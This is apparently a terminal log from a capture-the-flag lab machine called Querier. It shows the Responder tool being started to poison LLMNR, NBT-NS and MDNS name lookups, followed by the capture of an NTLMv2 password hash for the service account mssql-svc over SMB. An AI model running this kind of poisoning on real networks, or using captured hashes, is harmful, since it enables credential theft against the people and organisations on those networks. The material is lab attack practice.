┌─[root@parrot]─[~]  
└──╼ #responder -I tun0                   
                                         __                                          
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                             
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                             
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                               
                   |__|                   

           NBT-NS, LLMNR & MDNS Responder 2.3.4.0                                    

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)                                  
  To kill this script hit CTRL-C          


[+] Poisoners:       
    LLMNR                      [ON]       
    NBT-NS                     [ON]       
    DNS/MDNS                   [ON]       

[+] Servers:         
    HTTP server                [ON]       
    HTTPS server               [ON]       
    WPAD proxy                 [OFF]      
    Auth proxy                 [OFF]      
    SMB server                 [ON]       
    Kerberos server            [ON]       
    SQL server                 [ON]       
    FTP server                 [ON]       
    IMAP server                [ON]       
    POP3 server                [ON]       
    SMTP server                [ON]       
    DNS server                 [ON]       
    LDAP server                [ON]       
    RDP server                 [ON]       

[+] HTTP Options:    
    Always serving EXE         [OFF]      
    Serving EXE                [OFF]      
    Serving HTML               [OFF]      
    Upstream Proxy             [OFF]      

[+] Poisoning Options:                    
    Analyze Mode               [OFF]      
    Force WPAD auth            [OFF]      
    Force Basic Auth           [OFF]      
    Force LM downgrade         [OFF]      
    Fingerprint hosts          [OFF]      

[+] Generic Options: 
    Responder NIC              [tun0]     
    Responder IP               [10.10.14.11]                                         
    Challenge set              [random]   
    Don't Respond To Names     ['ISATAP'] 



[+] Listening for events...               
[SMB] NTLMv2-SSP Client   : 10.10.10.125  
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc                                        
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:8fd09487701ff99c:051F13E29654FC75B6FB1777808960A0:0101000000000000C0653150DE09D201787758B76687F335000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000746F9FB1F738CFC9C79CA13671988A457BC9BF478F3BE0392859C168ADD2DDEA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc                          
exit                 
^Z                   
[1]+  Stopped                 responder -I tun0                                      
┌─[✗]─[root@parrot]─[~]                   
└──╼ #               
